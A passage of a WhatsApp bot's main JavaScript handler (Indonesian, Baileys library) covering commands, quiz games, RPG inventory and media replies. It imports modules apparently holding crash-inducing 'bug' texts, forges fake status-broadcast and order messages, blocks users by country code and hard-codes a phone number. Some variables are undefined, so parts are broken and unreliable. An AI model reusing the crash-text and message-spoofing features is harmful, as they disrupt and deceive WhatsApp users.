const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@WhiskeySockets/Baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const { Primbon } = require('scrape-primbon')
const { remini } = require('./lib/remini.js')
const primbon = new Primbon()
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader.js')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter.js')
const { 
    getRegisteredRandomId, 
    addRegisteredUser, 
    createSerial, 
    checkRegisteredUser 
} = require('./lib/register.js')
const { 
    addResponList, 
    delResponList, 
    isAlreadyResponList, 
    isAlreadyResponListGroup, 
    sendResponList, 
    updateResponList, 
    getDataResponList 
} = require('./lib/addlist.js')
const {
    smsg,
    getGroupAdmins,
    formatp,
    tanggal,
    jam,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    reSize
} = require('./lib/myfunc.js')
const { buttonkal } = require('./database/buttonkal.js')
const { cttl } = require('./database/cttl.js')
const { xeontext1 } = require('./database/xeontext1.js')
const { textbug2 } = require('./database/textbug2.js')
const { textbug3 } = require('./database/textbug3.js')
const { textbug4 } = require('./database/textbug4.js')
const { textbug5 } = require('./database/textbug5.js')
const { addInventoriDarah,  cekDuluJoinAdaApaKagaDiJson,  addDarah,  kurangDarah, getDarah }= require('./src/darah.js')
const { cekInventoryAdaAtauGak,  addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion } = require('./src/alat_tukar.js')
const {  addInventoriMonay,  cekDuluJoinAdaApaKagaMonaynyaDiJson,  addMonay,  kurangMonay, getMonay } = require('./src/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, getLimit } = require('./src/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,  addKelinci,  addDomba,  addSapi, addGajah, kurangIkan, kurangAyam,  kurangKelinci,  kurangDomba,  kurangSapi, kurangGajah, getIkan, getAyam,  getKelinci, getDomba,getSapi, getGajah } = require('./src/buruan.js')
let DarahAwal =global.rpg.darahawal
const ikan = ['','','']
/* ~~~~~~~~~ FUNTION SYSTEM ~~~~~~~~~ */
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun.js')
/* ~~~~~~~~~ DATA GAME ~~~~~~~~~ */
let tebaklagu = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let akinator = []
/* ~~~~~~~~~ DATA ~~~~~~~~~ */
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'))
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let afk = require("./lib/afk.js")
let db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./src/data/owner.json'))
let _user = JSON.parse(fs.readFileSync('./src/data/user.json'))
let _afk = JSON.parse(fs.readFileSync('./src/data/user/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./src/total-hit-user.json'))
let autosimi = JSON.parse(fs.readFileSync('./src/data/simi.json'))
/* ~~~~~~~~~ DATA MEDIA ~~~~~~~~~ */
const Vnndaa = JSON.parse(fs.readFileSync('./src/media/vn.json'))
const Stickerndaa = JSON.parse(fs.readFileSync('./src/media/sticker.json'))
const Imagendaa = JSON.parse(fs.readFileSync('./src/media/image.json'))
const Videondaa = JSON.parse(fs.readFileSync('./src/media/video.json'))
/* ~~~~~~~~~ WAKTU SETEMPAT ~~~~~~~~~ */
moment.tz.setDefault("Asia/Jakarta").locale("id")

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const waktu = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if (waktu < "23:59:00") {
    var ucapanWaktu = 'Selamat Malam 🏙️'
}
if (waktu < "19:00:00") {
    var ucapanWaktu = 'Selamat Petang 🌆'
}
if (waktu < "18:00:00") {
    var ucapanWaktu = 'Selamat Sore 🌇'
}
if (waktu < "15:00:00") {
    var ucapanWaktu = 'Selamat Siang 🌤️'
}
if (waktu < "10:00:00") {
    var ucapanWaktu = 'Selamat Pagi 🌄'
}
if (waktu < "05:00:00") {
    var ucapanWaktu = 'Selamat Subuh 🌆'
}
if (waktu < "03:00:00") {
    var ucapanWaktu = 'Selamat Tengah Malam 🌃'
}
/* ~~~~~~~~~ STARTING & MODULE ALL ~~~~~~~~~ */
module.exports = ndaa = async (ndaa, m, msg, chatUpdate, store) => {
    try {
        /* ~~~~~~~~~ BASE ndaaDEV ~~~~~~~~~ */
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectnewReply.selectedRowId : (m.mtype == 'templateButtonnewReplyMessage') ? m.message.templateButtonnewReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectnewReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa
        const isCmd = body.startsWith(prefix, '')
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await ndaa.decodeJid(ndaa.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isSimi = autosimi.includes(from)
        /* ~~~~~~~~~ MEDIA ALL ~~~~~~~~~ */
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        /* ~~~~~~~~~ PREFIX V2 ~~~~~~~~~ */
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : '.'
        const isAsu = body.startsWith(pric)
        const isCommand = isAsu ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isAdrian = ('6285876054652@s.whatsapp.net').includes(m.sender)
        /* ~~~~~~~~~ GROUP SYSTEM ~~~~~~~~~ */
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await ndaa.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        /* ~~~~~~~~~ STATUS USERS ~~~~~~~~~ */
        const isCreator = [numberowner, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(ndaa, m, premium);
        //=================================================
async function loading () {
var aurelmandaa = [
"_Buy Script Chat Owner!_",
]
let { key } = await ndaa.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < aurelmandaa.length; i++) {
//await delay(10)
await ndaa.sendMessage(m.chat, {text: aurelmandaa[i], edit: key });//PESAN LEPAS
}
}
/* ~~~~~~~~~ CREATED PW RANDOM ~~~~~~~~~ */
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 15;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
 /* ~~~~~~~~~ FAKE ~~~~~~~~~ */
       const fkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `${namaowner}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${namabot},;;;\nFN:${namabot}\nitem1.TEL;waid=${numberowner}:+${numberowner}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': thumb,
                    thumbnail: thumb,
                    sendEphemeral: true
                }   
            }
        }
       const ftroli = {key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 999999,status: 200, thumbnail: fs.readFileSync(`./media/quoted.jpg`), surface: 200, message: fake, orderTitle: fake, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        /* ~~~~~~~~~ REPLY ~~~~~~~~~ */
        async function newReply(teks) {
            const po = {
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `Haloo ${pushname} 👋`,
                        body: jam(),
                        previewType: "PHOTO",
                        thumbnail: fs.readFileSync('./media/quoted.jpg'),
                        sourceUrl: global.link
                    }
                },
                text: teks
            };
            return ndaa.sendMessage(m.chat, po, {
                quoted: ftroli
            });
        };
        async function reply(teks) {
            ndaa.sendMessage(m.chat, { text: teks }, { quoted: m })
        }
        /* ~~~~~~~~~ ALL SYSTEM BOT ~~~~~~~~~ */
        if (!ndaa.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        if (autoread) {
            ndaa.readMessages([m.key])
        }
        if (autobio) {
        let _uptime = process.uptime() * 1000
        let uptime = clockString(_uptime)
        await ndaa.updateProfileStatus(`I am ${namabot} | Aktif Selama ${uptime} ⏳ | Mode : ${ndaa.public ? 'Public-Mode' : 'Self-Mode'}`).catch(_ => _)
        }
        if (from === 'status@broadcast') {
            ndaa.chatRead(from)
        }
        if (isCommand) {
            let titida = ['composing', 'recording']
            yte = titida[Math.floor(titida.length * Math.random())]
            ndaa.sendPresenceUpdate(yte, from)
        }
        if (m.sender.startsWith('212') && global.autoblok212 === true) {
            return ndaa.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && global.onlyindo === true) {
            return ndaa.updateBlockStatus(m.sender, 'block')
        }
        
        /* ~~~~~~~~~ CONSOLE ~~~~~~~~~ */
        if (isCommand) {
            console.log(`<=====================================>`)
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '<\> MESSAGE </>' : '<\> COMMAND </>')), chalk.black(chalk.bgGreen(hariini)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            console.log(`<=====================================>`)
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./src/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./src/total-hit-user.json'))[0].hit_cmd
        }
        /* ~~~~~~~~~ DATA RPG ~~~~~~~~~ */
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
        /* ~~~~~~~~~ RESPON DATA MEDIA ~~~~~~~~~ */
        for (let Mwuhehe of Vnndaa) {
            if (budy === Mwuhehe) {
                let audiobuffy = fs.readFileSync(`./media/audio/${Mwuhehe}.mp3`)
                ndaa.sendMessage(m.chat, {
                    audio: audiobuffy,
                    mimetype: 'audio/mp4',
                    ptt: true
                }, {
                    quoted: ftroli
                })
            }
        }
        for (let Mwuhehe of Stickerndaa) {
            if (budy === Mwuhehe) {
                let stickerbuffy = fs.readFileSync(`./media/sticker/${Mwuhehe}.webp`)
                ndaa.sendMessage(m.chat, {
                    sticker: stickerbuffy
                }, {
                    quoted: ftroli
                })
            }
        }
        for (let Mwuhehe of Imagendaa) {
            if (budy === Mwuhehe) {
                let imagebuffy = fs.readFileSync(`./media/image/${Mwuhehe}.jpg`)
                ndaa.sendMessage(m.chat, {
                    image: imagebuffy
                }, {
                    quoted: ftroli
                })
            }
        }
        for (let Mwuhehe of Videondaa) {
            if (budy === Mwuhehe) {
                let videobuffy = fs.readFileSync(`./media/video/${Mwuhehe}.mp4`)
                ndaa.sendMessage(m.chat, {
                    video: videobuffy
                }, {
                    quoted: ftroli
                })
            }
        }
       /* ~~~~~~~~~ CONST TAMBAHAN ~~~~~~~~~ */
        const isRegistered = checkRegisteredUser(m.sender)
        const pickRandom = (arr) => {
        return arr[Math.floor(Math.random() * arr.length)]
        }
        const getCase = (cases) => {
            return "case  "+`'${cases}'`+fs.readFileSync("./Ndaa.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
        }
        const totalFitur = () =>{
            var mytext = fs.readFileSync("./Ndaa.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        async function obfus(query) {
        return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
        compact: false,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        numbersToExpressions: true,
        simplify: true, 
        stringArrayShuffle: true,
        splitStrings: true,
        stringArrayThreshold: 1
        }
        );
        const result = {
        status: 200,
        author: `NdaaYT5`,
        result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
        } catch (e) {
        reject(e)
        }
        })
        }
        /* ~~~~~~~~~ FUNCTION TAMBAHAN ~~~~~~~~~ */
        async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        /* ~~~~~~~~~ RESPON CMD GAME~~~~~~~~~ */
        if (akinator.hasOwnProperty(m.sender.split('@')[0]) && isCmd && ["0", "1", "2", "3", "4", "5"].includes(body)) {
            kuis = true
            var {
                server,
                frontaddr,
                session,
                signature,
                question,
                step
            } = akinator[m.sender.split('@')[0]]
            if (step == "0" && budy == "5") newReply("Maaf Anda telah mencapai pertanyaan pertama")
            var ini_url = `https://api.lolhuman.xyz/api/akinator/answer?apikey=${lol}&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&answer=${budy}&step=${step}`
            var get_result = await fetchJson(ini_url)
            var get_result = get_result.result
            if (get_result.hasOwnProperty("name")) {
                var ini_name = get_result.name
                var description = get_result.description
                ini_txt = `${ini_name} - ${description}\n\n`
                ini_txt += "*Terima Kasih*\n*Powered By ndaaDev & LoL Human*"
                await ndaa.sendMessage(m.chat, {
                    image: {
                        url: get_result.image
                    },
                    caption: ini_txt
                }).then(() => {
                    delete akinator[m.sender.split('@')[0]]
                    fs.writeFileSync("./src/data/akinator.json", JSON.stringify(akinator))
                })
                return
            }
            var {
                question,
                _,
                step
            } = get_result
            ini_txt = `${question}\n\n`
            ini_txt += "0 - Ya\n"
            ini_txt += "1 - Tidak\n"
            ini_txt += "2 - Saya Tidak Tau\n"
            ini_txt += "3 - Mungkin\n"
            ini_txt += "4 - Mungkin Tidak\n"
            ini_txt += "5 - Kembali ke Pertanyaan Sebelumnya"
            if (args[0] === '5') {
                var ini_url = `https://api.lolhuman.xyz/api/akinator/back?apikey=${lol}&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&answer=${budy}&step=${step}`
                var get_result = await fetchJson(ini_url)
                var get_result = get_result.result
                var {
                    question,
                    _,
                    step
                } = get_result
                ini_txt = `${question}\n\n`
                ini_txt += "0 - Ya\n"
                ini_txt += "1 - Tidak\n"
                ini_txt += "2 - Saya Tidak Tau\n"
                ini_txt += "3 - Mungkin\n"
                ini_txt += "4 - Mungkin Tidak"
                ini_txt += "5 - Kembali ke Pertanyaan Sebelumnya"
            }
            ndaa.sendText(m.chat, ini_txt, m).then(() => {
                const data_ = akinator[m.sender.split('@')[0]]
                data_["question"] = question
                data_["step"] = step
                akinator[m.sender.split('@')[0]] = data_
                fs.writeFileSync("./src/data/akinator.json", JSON.stringify(akinator))
            })
        }
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebakgambar[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete kuismath[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await newReply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakasahotak[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaksiapakahaku[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebaksiapakahaku[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaksiapakahaku[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaksusunkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakbendera[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakbendera2[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkimia[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktekateki[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebaktekateki[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaktekateki[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebaklagu[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebakkata[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebakkalimat[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebaklirik[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await newReply('*Anda Telah menyerah*')
                delete tebaktebakan[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await ndaa.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else newReply('*Jawaban Salah!*')
        }
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // newReply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) { // nek wayahku
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                newReply({
                    '-3': 'Game telah berakhir',
                    '-2': 'Invalid',
                    '-1': 'Posisi Invalid',
                    0: 'Posisi Invalid',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['', ''][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
: @${room.game.playerX.split('@')[0]}
: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) ndaa.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            ndaa.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        /* ~~~~~~~~~ RESPON USER AFK ~~~~~~~~~ */
        if (m.isGroup && !m.key.fromMe) {
